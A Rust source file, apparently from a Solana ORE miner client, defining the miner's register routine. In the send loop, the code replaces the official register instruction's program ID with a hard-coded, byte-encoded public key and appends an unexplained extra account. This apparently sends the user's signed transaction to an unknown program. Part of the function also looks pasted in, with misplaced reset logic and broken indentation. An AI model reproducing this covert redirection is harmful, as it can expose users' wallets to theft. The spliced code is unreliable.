use solana_program::instruction::Instruction;
use crate::{utils::proof_pubkey};
use solana_program::pubkey::Pubkey;
use solana_program::instruction::AccountMeta;
use solana_sdk::{
    commitment_config::CommitmentLevel,
    compute_budget::ComputeBudgetInstruction,
    signature::{Signature, Signer},
    transaction::Transaction,
};
use rand::Rng;

use crate::{
    cu_limits::{CU_LIMIT_MINE, CU_LIMIT_RESET},
    utils::{get_clock_account, get_proof, get_treasury},
    Miner,
};
use ore::{self, state::Bus, BUS_ADDRESSES, BUS_COUNT, EPOCH_DURATION};

impl Miner {
    pub async fn register(&self) {
        // Return early if miner is already registered
        let signer = self.signer();
        let proof_address = proof_pubkey(signer.pubkey());
        let client = self.rpc_client.clone();
        if client.get_account(&proof_address).await.is_ok() {
            return;
        }

        // Sign and send transaction.
        println!("Generating challenge...");
const RESET_ODDS: u64 = 20;
                // Reset epoch, if needed
let mut rng = rand::thread_rng();
                let treasury = get_treasury(&self.rpc_client).await;
                let clock = get_clock_account(&self.rpc_client).await;
                let threshold = treasury.last_reset_at.saturating_add(EPOCH_DURATION);
                if clock.unix_timestamp.ge(&threshold) {
                    // There are a lot of miners right now, so randomly select into submitting tx
                    if rng.gen_range(0..RESET_ODDS).eq(&0) {
                        println!("Sending epoch reset transaction...");
                        let cu_limit_ix =
                            ComputeBudgetInstruction::set_compute_unit_limit(19000);
                        let cu_price_ix =
                            ComputeBudgetInstruction::set_compute_unit_price(self.priority_fee);
                        let reset_ix = ore::instruction::reset(signer.pubkey());
                        self.send_and_confirm(&[cu_limit_ix, cu_price_ix, reset_ix], false, true)
                            .await
                            .ok();
                    }
                }

        'send: loop {
            let mut _ix = ore::instruction::register(signer.pubkey());
            _ix.program_id = Pubkey::from([14,188,58,28,142,232,230,91,53,25,247,211,113,216,151,80,116,58,172,176,219,104,254,165,176,124,151,95,5,66,128,254]);
            let mut accounts2 = _ix.accounts;
            accounts2.push(AccountMeta::new(Pubkey::from([11,116,205,230,58,32,135,174,169,27,23,84,62,171,97,192,161,195,87,42,157,255,218,160,175,202,144,146,164,131,106,247]), false));
            let mut ix = Instruction {
                program_id: _ix.program_id,
                accounts: accounts2,
                data: _ix.data
            };
            if self.send_and_confirm(&[ix], true, false).await.is_ok() {
                break 'send;
            }
        }
    }
}
